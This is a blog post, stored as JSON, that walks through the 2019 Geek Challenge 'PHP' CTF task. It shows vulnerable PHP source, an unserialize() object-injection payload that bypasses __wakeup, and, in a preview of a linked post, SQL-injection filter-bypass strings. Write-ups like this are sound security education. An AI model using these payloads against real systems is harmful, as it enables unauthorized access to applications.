{"title":"极客大挑战 2019-PHP","uid":"302c7bdbfada1577452736dc43f46350","slug":"极客大挑战-2019-PHP","date":"2023-03-10T11:12:40.000Z","updated":"2023-03-10T12:41:58.061Z","comments":true,"path":"api/articles/极客大挑战-2019-PHP.json","keywords":null,"cover":[],"content":"<p><img src=\"/images/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1.png\"></p>\n<p>进入题目后，提示备份网站</p>\n<p>用dirmap对网站目录进行扫描发现<a href=\"http://www.zip/\">www.zip</a></p>\n<p>下载后打开</p>\n<p><img src=\"/images/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/2.png\"></p>\n<p><img src=\"/images/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/3.png\"></p>\n<p>其中的flag文件为假php</p>\n<p>查看class.php中的内容</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\ninclude &#39;flag.php&#39;;\n\n\nerror_reporting(0);\n\n\nclass Name&#123;\n    private $username &#x3D; &#39;nonono&#39;;\n    private $password &#x3D; &#39;yesyes&#39;;\n\n    public function __construct($username,$password)&#123;\n        $this-&gt;username &#x3D; $username;\n        $this-&gt;password &#x3D; $password;\n    &#125;\n\n    function __wakeup()&#123;\n        $this-&gt;username &#x3D; &#39;guest&#39;;\n    &#125;\n\n    function __destruct()&#123;\n        if ($this-&gt;password !&#x3D; 100) &#123;\n            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;\n            echo &quot;You name is: &quot;;\n            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;\n            echo &quot;You password is: &quot;;\n            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;\n            die();\n        &#125;\n        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;\n            global $flag;\n            echo $flag;\n        &#125;else&#123;\n            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;\n            die();\n\n            \n        &#125;\n    &#125;\n&#125;\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>定义了一个类，在__destruct中要求password的值为100，username中的内容为admin</p>\n<p>其中__wakeup()函数会将username的值设置为guest</p>\n<p>但是class类中并没有输入参数的方式</p>\n<p>查看index.php，其中</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n    include &#39;class.php&#39;;\n    $select &#x3D; $_GET[&#39;select&#39;];\n    $res&#x3D;unserialize(@$select);\n    ?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>包含了class.php，通过GET方式获取select，unserialize为反序列化函数</p>\n<p><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串。</p>\n<p><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>\n<p><strong>unserialize()</strong> 函数用于将通过<strong>serialize()</strong> 函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>\n<p>通过序列化函数构造要输入的结构</p>\n<p><img src=\"/images/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/4.png\"></p>\n<p><strong>var_dump()</strong> 函数用于输出变量的相关信息。</p>\n<p><strong>var_dump()</strong> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构</p>\n<p><img src=\"/images/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/5.png\"></p>\n<p>其中的不可显示字符在url中可用%00表示</p>\n<p><img src=\"/images/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/6.png\"></p>\n<p> 要绕过__wakeup只要让说明的参数个数大于实际的参数个数就行了。</p>\n<p>将</p>\n<p>O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name %00password”;s:3:”100”;}</p>\n<p>改为</p>\n<p>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>\n<p>得到flag</p>\n<p><img src=\"/images/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/7.png\"></p>\n","text":" 进入题目后，提示备份网站 用dirmap对网站目录进行扫描发现www.zip 下载后打开 其中的flag文件为假php 查看class.php中的内容 &lt;?php include &#39;flag.php&#39;; error_reporting(0); class ...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ACTF2020 新生赛-BackupFile","uid":"fc98a982ac40604a05e9655acd6d7c89","slug":"ACTF2020-新生赛-BackupFile","date":"2023-03-16T11:28:49.000Z","updated":"2023-03-16T11:34:05.570Z","comments":true,"path":"api/articles/ACTF2020-新生赛-BackupFile.json","keywords":null,"cover":[],"text":" 题目为找出备份文件 本题的备份文件为index.php.bak 查看文件内容 要求输入内容为数字，并与字符串123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3 由于&#x3D;&#x3D;是PHP中的弱类型比较，int和string无法直接比...","link":"","photos":[],"count_time":{"symbolsCount":208,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"极客大挑战 2019-BabySQL","uid":"3366e220449692ebde433e9d5658615a","slug":"极客大挑战-2019-BabySQL","date":"2023-03-09T11:25:55.000Z","updated":"2023-03-09T11:50:22.424Z","comments":true,"path":"api/articles/极客大挑战-2019-BabySQL.json","keywords":null,"cover":[],"text":" 进入题目，发现是SQL注入问题 尝试使用万能密码 发现在报错信息中没有出现or，判断有关键字过滤 尝试双写绕过 成功登录 测试列数 1’ oorrder bbyy 4 – + 1’ oorrder bbyy 3 – + 成功进入即有三列 获取数据库名 1’ uunionnion...","link":"","photos":[],"count_time":{"symbolsCount":597,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}